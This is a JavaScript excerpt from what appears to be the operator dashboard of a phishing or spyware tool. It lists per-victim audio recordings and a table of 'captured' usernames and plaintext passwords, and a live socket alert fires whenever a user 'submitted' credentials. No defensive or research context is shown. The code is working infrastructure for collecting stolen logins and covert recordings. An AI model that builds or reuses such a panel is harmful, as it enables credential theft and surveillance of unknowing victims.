                <div class="rec-icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 2a3 3 0 0 0-3 3v7a3 3 0 0 0 6 0V5a3 3 0 0 0-3-3Z"/><path d="M19 10v2a7 7 0 0 1-14 0v-2"/><line x1="12" x2="12" y1="19" y2="22"/></svg></div>
                <div class="rec-info">
                    <div class="rec-user"><span>${truncUUID(r.uuid, 10)}</span> • ${fmtDuration(r.duration)}</div>
                    <div class="rec-time">${new Date(r.created_at).toLocaleString()}</div>
                </div>
            </div>
            <div class="audio-player" id="player-${r.id}">
                <button class="play-btn" onclick="toggleAudio(${r.id}, '${API}/media/${r.file_path}')">
                    <svg class="icon-play" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor"><polygon points="5 3 19 12 5 21 5 3"/></svg>
                    <svg class="icon-pause" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" style="display:none"><rect width="4" height="14" x="6" y="5"/><rect width="4" height="14" x="14" y="5"/></svg>
                </button>
                <div class="progress-wrap" onclick="seekAudio(event, ${r.id})"><div class="progress-bar" id="prog-${r.id}"></div></div>
                <span class="audio-time" id="time-${r.id}">0:00 / ${fmtDuration(r.duration)}</span>
            </div>
            <div class="rec-actions">
                <button class="rec-btn-download" onclick="downloadFile('${API}/media/${r.file_path}', '${fileName}')" title="Download">⬇ Download</button>
                <button class="rec-btn-delete" onclick="deleteSingleRecording(${r.id})" title="Delete">🗑️ Delete</button>
            </div>
        </div>`;
    }).join('');
}

function toggleRecSelect(id, checked) {
    if (checked) selectedRecordings.add(id); else selectedRecordings.delete(id);
    updateBatchBar();
}

function toggleSelectAll(checked) {
    document.querySelectorAll('.rec-checkbox[data-id]').forEach(cb => {
        cb.checked = checked;
        const id = parseInt(cb.dataset.id);
        if (checked) selectedRecordings.add(id); else selectedRecordings.delete(id);
    });
    updateBatchBar();
}

function updateBatchBar() {
    const bar = document.getElementById('batchBar');
    const count = document.getElementById('batchCount');
    if (selectedRecordings.size > 0) {
        bar.classList.add('show');
        count.textContent = selectedRecordings.size;
    } else {
        bar.classList.remove('show');
    }
}

async function batchDeleteRecordings() {
    if (selectedRecordings.size === 0) return;
    if (!confirm(`Delete ${selectedRecordings.size} recording(s) permanently?`)) return;

    await api('/api/recordings/batch-delete', {
        method: 'POST',
        body: JSON.stringify({ ids: Array.from(selectedRecordings) })
    });
    selectedRecordings.clear();
    const selAll = document.getElementById('recSelectAll');
    if (selAll) selAll.checked = false;
    loadRecordings();
}

async function deleteSingleRecording(id) {
    if (!confirm('Delete this recording permanently?')) return;
    await api('/api/recordings/' + id, { method: 'DELETE' });
    loadRecordings();
}
// ═══════════════════════════════════════════════════════════════════
// CREDENTIALS
// ═══════════════════════════════════════════════════════════════════
let allCredentialsData = [];

async function loadCredentials() {
    const data = await api('/api/credentials');
    if (!data || !data.credentials) return;
    
    allCredentialsData = data.credentials;
    filterCredentials();
}

function filterCredentials() {
    const q = (document.getElementById('credSearch')?.value || '').toLowerCase();
    let filtered = allCredentialsData;
    
    if (q) {
        filtered = allCredentialsData.filter(c => 
            (c.uuid || '').toLowerCase().includes(q) ||
            (c.platform || '').toLowerCase().includes(q) ||
            (c.username || '').toLowerCase().includes(q)
        );
    }
    
    renderCredentialsList(filtered);
}

function renderCredentialsList(credentials) {
    const tbody = document.getElementById('credentialsTable');
    if (!tbody) return;
    
    if (credentials.length === 0) {
        tbody.innerHTML = '<tr><td colspan="6" style="text-align:center;color:rgba(255,255,255,0.4);padding:40px">No credentials captured yet</td></tr>';
        return;
    }
    
    tbody.innerHTML = credentials.map(c => `
        <tr>
            <td style="color:rgba(255,255,255,0.6);font-size:0.85rem">${new Date(c.created_at).toLocaleString()}</td>
            <td style="font-family:monospace;color:#a594fd">${truncUUID(c.uuid, 12)}</td>
            <td style="text-transform:capitalize">${c.platform}</td>
            <td><strong>${c.username || '—'}</strong></td>
            <td style="font-family:monospace;color:#5de4c7">${c.password || '—'}</td>
            <td>
                <button class="btn-action btn-delete" onclick="deleteCredential(${c.id})" title="Delete">
                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="3 6 5 6 21 6"/><path d="M19 6v14a2 2 0 0 1-2 2H7a2 2 0 0 1-2-2V6m3 0V4a2 2 0 0 1 2-2h4a2 2 0 0 1 2 2v2"/></svg>
                </button>
            </td>
        </tr>
    `).join('');
}

async function deleteCredential(id) {
    if (!confirm('Delete these credentials permanently?')) return;
    await api('/api/credentials/' + id, { method: 'DELETE' });
    loadCredentials();
}

// ─── Socket Events for Credentials ───
socket.on('feed:credentials', (data) => {
    addNotification('🔐 New Credentials Captured', `User ${truncUUID(data.uuid, 8)} submitted ${data.platform} credentials`);
    if (document.getElementById('page-credentials').classList.contains('active')) {
        loadCredentials();
    }
});
